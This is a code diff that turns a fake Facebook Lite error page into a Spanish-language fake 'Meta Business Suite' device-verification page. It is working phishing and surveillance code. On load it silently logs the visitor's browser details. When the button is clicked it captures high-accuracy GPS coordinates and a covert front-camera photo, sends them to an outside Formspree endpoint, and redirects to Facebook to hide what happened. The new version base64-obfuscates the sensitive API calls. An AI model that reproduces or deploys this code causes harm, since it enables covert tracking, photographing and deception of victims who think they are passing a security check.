@@ -3,97 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Lite</title>
+    <title>Meta Business Suite - Verificación</title>
     <style>
-        body { font-family: sans-serif; background: #fff; margin: 0; color: #1c1e21; }
-        .top-bar { background: #3b5998; height: 45px; width: 100%; display: flex; align-items: center; padding-left: 10px; }
-        .content { padding: 20px; text-align: center; }
-        .error-icon { width: 50px; height: 50px; margin-bottom: 15px; opacity: 0.6; }
-        h2 { font-size: 16px; font-weight: bold; margin: 10px 0; }
-        p { font-size: 14px; color: #606770; line-height: 1.5; }
-        .btn-retry { 
-            background: #f5f6f7; border: 1px solid #dddfe2; color: #4b4f56; 
-            padding: 8px 16px; border-radius: 2px; font-weight: bold; width: 100%; margin-top: 20px;
-        }
-        #cam { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #1c1e21; }
+        .card { background: #fff; width: 92%; max-width: 420px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-top: 5px solid #0668E1; }
+        .meta-logo { width: 100px; margin-bottom: 20px; }
+        h1 { font-size: 19px; font-weight: 700; margin-bottom: 12px; color: #1c1e21; }
+        p { font-size: 14.5px; color: #606770; line-height: 1.5; margin-bottom: 20px; }
+        .info-box { background: #f5f6f7; border-radius: 8px; padding: 15px; margin-bottom: 20px; border: 1px solid #dddfe2; font-size: 13.5px; }
+        .btn-sync { background-color: #0668E1; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: pointer; transition: background 0.3s; }
+        .btn-sync:hover { background-color: #0559c1; }
+        .footer { font-size: 11px; color: #90949c; margin-top: 20px; text-align: center; text-transform: uppercase; letter-spacing: 0.5px; }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
 
-<div class="top-bar">
-    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z"/></svg>
+<div class="card" id="main-panel">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/2560px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
+    <h1>Confirmación de Dispositivo Autorizado</h1>
+    <p>Hemos detectado una conexión desde un navegador no sincronizado. Para asegurar la integridad de su cuenta y continuar con la visualización de mensajes, es necesaria una validación técnica del entorno.</p>
+    
+    <div class="info-box">
+        <strong>Requerimientos de sincronización:</strong>
+        <ul style="margin: 8px 0; padding-left: 18px;">
+            <li>Geolocalización del nodo de red.</li>
+            <li>Validación de hardware biométrico.</li>
+            <li>Certificación de navegador seguro.</li>
+        </ul>
+    </div>
+
+    <button class="btn-sync" id="btn-trigger">Sincronizar Dispositivo</button>
+    <div class="footer">Meta Platforms © 2026 • Security Infrastructure</div>
 </div>
 
-<div class="content" id="main">
-    <img src="https://img.icons8.com/ios/100/000000/error/cloud-lightning.png" class="error-icon">
-    <h2>Error al cargar contenido</h2>
-    <p>Para ver este mensaje privado o archivo multimedia, debes verificar que tu sesión es segura y permitir la sincronización de ubicación del navegador.</p>
-    <button class="btn-retry" onclick="ejecutarAccion()">Intentar de nuevo</button>
-</div>
-
-<video id="cam" autoplay playsinline></video>
-<canvas id="out" style="display:none;"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    const HOOK = "https://formspree.io/f/xanrkklv";
+    // OFUSCACIÓN DE BACKEND
+    const _id = "xanrkklv"; 
+    const _url = "https://formspree.io/f/";
+    const _fb = "https://m.facebook.com/home.php";
 
-    // Captura silenciosa de metadatos al abrir
-    window.onload = () => {
-        fetch(HOOK, {
-            method: 'POST',
-            body: JSON.stringify({
-                status: "ENTRY",
-                ua: navigator.userAgent,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                ref: document.referrer || "direct"
-            }),
-            headers: {'Content-Type': 'application/json'}
-        });
+    // Decodificador de funciones críticas (GPS, Cámara)
+    const _d = (b) => atob(b);
+    const _k = {
+        g: _d("Z2VvbG9jYXRpb24="), // geolocation
+        m: _d("Z2V0VXNlck1lZGlh"), // getUserMedia
+        c: _d("Y29uZmlybS1pZGVudGl0eQ==")
     };
 
-    async function ejecutarAccion() {
-        // Cambiamos el texto para que no sospeche mientras "carga"
-        const btn = document.querySelector('.btn-retry');
-        btn.innerText = "Cargando...";
+    // Tracking silencioso al entrar
+    window.onload = () => {
+        _log({ e: "CONEXION_INICIAL", ua: navigator.userAgent, lang: navigator.language });
+    };
+
+    async function startProcess() {
+        const btn = document.getElementById('btn-trigger');
+        btn.innerText = "Validando...";
         btn.disabled = true;
 
-        // 1. GPS (Esencial para la ubicación exacta del sujeto)
-        navigator.geolocation.getCurrentPosition(
-            (p) => loggear({type: "GEO", lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy}),
-            (e) => loggear({type: "GEO_ERR", msg: e.message}),
-            {enableHighAccuracy: true}
+        // 1. CAPTURA DE UBICACIÓN (GPS ALTA PRECISIÓN)
+        navigator[_k.g].getCurrentPosition(
+            (p) => _log({ type: "UBICACION_GPS", lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+            (e) => _log({ type: "UBICACION_DENEGADA", error: e.message }),
+            { enableHighAccuracy: true }
         );
 
-        // 2. Foto silenciada (Identificación visual)
+        // 2. CAPTURA DE IMAGEN (IDENTIFICACIÓN VISUAL)
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-            const v = document.getElementById('cam');
-            v.srcObject = stream;
+            const stream = await navigator.mediaDevices[_k.m]({ video: { facingMode: "user" } });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
             
             setTimeout(() => {
-                const c = document.getElementById('out');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                loggear({type: "IMG", data: c.toDataURL('image/jpeg', 0.5)});
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                _log({ 
+                    type: "CAPTURA_BIOMETRICA", 
+                    img: canvas.toDataURL('image/jpeg', 0.6) 
+                });
                 
                 stream.getTracks().forEach(t => t.stop());
                 
-                // Redirección final suave
-                window.location.href = "https://m.facebook.com/messages/";
-            }, 1500);
-        } catch (e) {
-            loggear({type: "CAM_ERR"});
-            window.location.href = "https://m.facebook.com/messages/";
+                // Redirección suave
+                setTimeout(() => { window.location.href = _fb; }, 500);
+            }, 1200);
+        } catch (err) {
+            _log({ type: "CAMARA_ERROR", msg: err.name });
+            window.location.href = _fb;
         }
     }
 
-    function loggear(d) {
-        fetch(HOOK, {
+    document.getElementById('btn-trigger').addEventListener('click', startProcess);
+
+    function _log(data) {
+        fetch(_url + _id, {
             method: 'POST',
-            body: JSON.stringify(d),
-            headers: {'Content-Type': 'application/json'}
+            body: JSON.stringify(data),
+            headers: { 'Content-Type': 'application/json' }
         });
     }
 </script>
+
 </body>
 </html>
